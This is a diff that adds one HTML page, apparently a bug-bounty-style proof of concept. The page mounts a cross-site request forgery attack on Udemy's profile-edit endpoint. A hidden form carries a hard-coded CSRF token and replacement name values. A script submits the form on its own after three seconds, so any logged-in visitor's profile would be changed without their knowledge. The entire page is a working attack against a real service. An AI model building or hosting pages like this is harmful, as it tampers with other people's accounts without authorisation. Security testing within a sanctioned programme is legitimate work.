@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Test via GitHub Pages</title>
+    <meta name="referrer" content="unsafe-url">
+</head>
+<body>
+    <h2>Testing CSRF from External Domain</h2>
+    
+    <form id="csrfForm" action="https://www.udemy.com/user/edit-profile/" method="POST" target="_blank">
+        <input type="hidden" name="csrfmiddlewaretoken" value="ec9ht2NcyKdkVs9Q5D9FhB4qlOoRaWS6CQPCIk82PF7QsiqkxbEPHDsipG1eoAqp">
+        <input type="hidden" name="first_name" value="GITHUB_CSRF">
+        <input type="hidden" name="last_name" value="BYPASS_TEST">
+        <input type="submit" value="Execute CSRF from GitHub">
+    </form>
+    
+    <p>Referer: https://[username].github.io/csrf-test-udemy/</p>
+    <p>Testing external domain CSRF attack...</p>
+    
+    <script>
+    // Auto-submit after 3 seconds
+    setTimeout(() => {
+        console.log('Executing CSRF attack...');
+        document.getElementById('csrfForm').submit();
+    }, 3000);
+    </script>
+</body>
+</html>
